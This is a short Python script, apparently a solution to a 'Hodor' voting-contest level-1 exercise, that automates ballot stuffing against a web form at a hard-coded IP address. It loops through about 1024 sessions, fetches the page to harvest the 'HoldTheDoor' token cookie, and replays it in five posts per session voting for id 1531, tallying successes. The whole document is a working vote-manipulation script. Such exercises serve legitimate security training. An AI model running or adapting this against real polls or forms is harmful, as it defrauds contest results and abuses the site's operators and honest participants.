#!/usr/bin/python3
'''
This module sends post methods to hodor voting contest
with specific cookies for the `key` input on the `form`.
'''

import requests

url = 'http://158.69.76.135/level1.php'
successes = 0
failures = 0


def v_post(m_get, session, url):
    '''
    This function sends the posts toward an specific `url`
    with an specific `session` and returns the status code
    of the petition.

    ARGUMENTS:
    → m_get {GET method} is the get method that will be used for maintain
    a cookie by session.
    → session {Session} is the session that we want to maintain in the
    petition.
    → url {Host} is the direction where we're going to send petitions.
    '''

    cookies = m_get.cookies.get('HoldTheDoor')
    post = session.post(
        url, {'id': '1531', 'holdthedoor': 'Submit', 'key': cookies})
    print('STATUS → {}\nCOOKIES → {}'.format(
        post.status_code, cookies))
    return (post.status_code)


for p_post in range(1024):
    with requests.Session() as p_session:
        get = p_session.get(url)
        if v_post(get, p_session, url) == 200:
            successes += 1
        else:
            failures += 1
        for s_post in range(4):
            get = p_session.get(url)
            if v_post(get, p_session, url) == 200:
                successes += 1
            else:
                failures += 1

print('Successes → {}\nFailures → {}'.format(successes, failures))
